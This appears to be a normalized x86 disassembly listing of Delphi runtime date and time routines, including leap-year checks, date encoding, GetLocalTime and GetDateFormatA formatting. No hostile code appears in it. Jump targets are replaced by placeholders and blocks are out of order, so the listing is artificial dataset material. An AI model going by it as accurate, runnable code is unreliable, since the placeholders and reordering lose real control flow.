call j_sub_402d38
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40974a
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409766
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40979c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409188
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40406c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4097cc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409188
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40406c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409818
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40443c
mov edx esp
xor ecx ecx
call sub_409688
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409844
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40443c
mov edx esp
xor ecx ecx
call sub_409688
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40988c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4098d0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4098d0
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407de0
sub_409980
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40988c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407dc4
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407dc4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407dc4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4099dc
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4099dc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409ae0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409a18
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407de0
sub_409b10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40988c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407dc4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407dc4
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407dc4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4099dc
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c5c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b10
pop esi
pop ecx
pop ebp
retn 0x8
sub_409c7c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_409b10
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_409980
pop ebx
pop ebp
retn 0x8
sub_409cbc
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409ae0
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409940
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_409940
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409d2c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40988c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409d54
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409ae0
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_409940
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409da4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_4029fc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_4029cc
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_4029cc
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409e0c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402968
sub_409e50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40423c
mov edx eax
mov eax ebx
call sub_409e0c
pop ecx
pop ebx
pop ebp
retn
sub_409e70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408c78
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409e0c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ebc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409ee8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c5c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409f20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409980
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409f60
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a0ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f7c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a0b5
lea eax [ ebp - 0x118 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041ec
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40423c
mov edx eax
mov eax [ ebx ]
call sub_40c544
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c6b8
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40449c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c654
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404174
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c6b8
mov ecx eax
mov eax ebx
mov edx esi
call sub_40406c
sub_40a0c8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a1a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f7c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1ad
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041ec
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40423c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40449c
sub_40a1d0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a951
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a958
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fa0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c738
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c718
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409e0c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c738
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409e0c
pop ecx
mov al [ eax + lookup_table_40a2b3 ]
jmp [ eax * 4 + jump_table_40a2ec ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409ee8
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409f60
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409e50
pop ecx
jmp r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a0c8
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409e50
pop ecx
jmp r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ebc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409f20
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409f20
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409f20
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ebc
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409ebc
pop ecx
push ebp
call sub_409f20
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409f20
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
push ebp
call sub_409ebc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
push ebp
call sub_409f20
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409e70
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409e70
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409e0c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409e0c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409e0c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d2c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409e0c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409e0c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d2c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c738
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409e0c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409e70
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409d2c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409e50
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e50
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e50
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c738
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a1d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409e0c
pop ecx
jmp r-xdata
push ebp
call sub_409ee8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
